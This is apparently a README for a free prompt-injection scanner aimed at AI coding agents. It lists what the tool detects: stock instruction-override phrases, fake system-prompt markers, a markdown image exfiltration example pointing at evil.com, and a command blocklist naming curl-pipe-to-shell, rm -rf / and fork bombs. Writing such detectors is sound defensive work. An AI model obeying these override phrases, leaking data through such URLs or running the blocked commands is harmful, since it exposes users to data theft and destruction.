# OpenClaw Bastion

Free prompt injection defense for [OpenClaw](https://github.com/openclaw/openclaw), [Claude Code](https://docs.anthropic.com/en/docs/claude-code), and any Agent Skills-compatible tool.

Scans runtime content for injection attempts, analyzes content boundaries, detects hidden instructions, and maintains command allowlists — the input/output boundary defense that other tools miss.

**Want automated countermeasures?** Upgrade to Pro — runtime content sanitization, auto-quarantine, canary testing, and policy enforcement via hooks. [Get Pro access](https://github.com/sponsors/AtlasPA).

## How Bastion Differs from Warden

| Tool                 | Domain                       | What It Watches                                                                                                   |
| -------------------- | ---------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| **openclaw-warden**  | Workspace identity integrity | SOUL.md, AGENTS.md, IDENTITY.md, memory files — the files that define agent behavior                              |
| **openclaw-bastion** | Runtime content boundaries   | Files being read by the agent, web content, API responses, user-supplied documents — everything the agent ingests |

Warden watches the **identity layer**. Bastion watches the **content layer**. Use both for defense in depth.

## Install

```bash
# Clone
git clone https://github.com/AtlasPA/openclaw-bastion.git

# Copy to your workspace skills directory
cp -r openclaw-bastion ~/.openclaw/workspace/skills/
```

## Usage

```bash
# Scan entire workspace for injection patterns
python3 scripts/bastion.py scan

# Scan a specific file or directory
python3 scripts/bastion.py scan path/to/file.md
python3 scripts/bastion.py scan docs/

# Quick single-file check
python3 scripts/bastion.py check report.md

# Analyze content boundaries
python3 scripts/bastion.py boundaries

# View command allowlist/blocklist
python3 scripts/bastion.py allowlist

# Quick posture summary
python3 scripts/bastion.py status
```

All commands accept `--workspace /path/to/workspace`. If omitted, auto-detects from `$OPENCLAW_WORKSPACE`, current directory, or `~/.openclaw/workspace`.

## What It Detects

### Injection Patterns

- **Instruction override** — "ignore previous instructions", "disregard above", "you are now", "new system prompt", "forget your instructions", "override safety", "entering developer mode"
- **System prompt markers** — `<system>`, `[SYSTEM]`, `<<SYS>>`, `<|im_start|>system`, `[INST]`, `### System:`
- **Hidden instructions** — Multi-turn manipulation ("in your next response, you must..."), stealth patterns ("do not tell the user", "hide this from the output")
- **Markdown exfiltration** — Image tags with encoded data in URLs (`![](http://evil.com?data=BASE64)`)
- **HTML injection** — `<script>`, `<iframe>`, `<img onerror=>`, `<svg onload=>`, hidden divs
- **Shell injection** — `$(command)` subshell execution outside code blocks
- **Encoded payloads** — Large base64 blobs outside code blocks
- **Unicode tricks** — Zero-width characters, RTL overrides, invisible formatting
- **Homoglyph substitution** — Cyrillic/Latin lookalikes mixed into ASCII text
- **Delimiter confusion** — Fake markdown code block boundaries to escape context
- **Dangerous commands** — `curl | bash`, `wget | sh`, `rm -rf /`, fork bombs

### Boundary Analysis

- Agent instruction files containing mixed trusted/untrusted content
- Writable instruction files (attack surface for compromised skills)
- Blast radius assessment for each critical file

### Smart Detection

- Respects markdown fenced code blocks (no false positives on documented examples)
- Per-file risk scoring (CLEAN / INFO / LOW / MEDIUM / HIGH / CRITICAL)
- Skips its own skill files (which describe injection patterns)
- Context-aware: only flags patterns in active content, not examples

## Command Policy

Bastion maintains a `.bastion-policy.json` in the workspace root with:

- **Allowlist**: Standard safe commands (git, python, node, npm, etc.)
- **Blocklist**: Dangerous patterns (curl pipe to shell, rm -rf /, fork bombs, etc.)

Run `allowlist` to create the default policy and view it. Edit the JSON file directly to customize.

## Exit Codes

| Code | Meaning           |
| ---- | ----------------- |
| 0    | Clean             |
| 1    | Warnings detected |
| 2    | Critical findings |

## Free vs Pro

| Feature                         | Free | [Pro](https://github.com/sponsors/AtlasPA) |
| ------------------------------- | ---- | ------------------------------------------ |
| Injection pattern scanning      | Yes  | Yes                                        |
| Boundary analysis               | Yes  | Yes                                        |
| Command allowlist display       | Yes  | Yes                                        |
| Per-file risk scoring           | Yes  | Yes                                        |
| Context-aware detection         | Yes  | Yes                                        |
| Active content sanitization     | -    | Yes                                        |
| Runtime blocking via hooks      | -    | Yes                                        |
| Auto-quarantine injected files  | -    | Yes                                        |
| Canary token testing            | -    | Yes                                        |
| Policy enforcement (PreToolUse) | -    | Yes                                        |
| Sanitize-on-read pipeline       | -    | Yes                                        |
| Alerting and audit log          | -    | Yes                                        |

## Requirements

- Python 3.8+
- No external dependencies (stdlib only)
- Cross-platform: Windows, macOS, Linux

## License

MIT
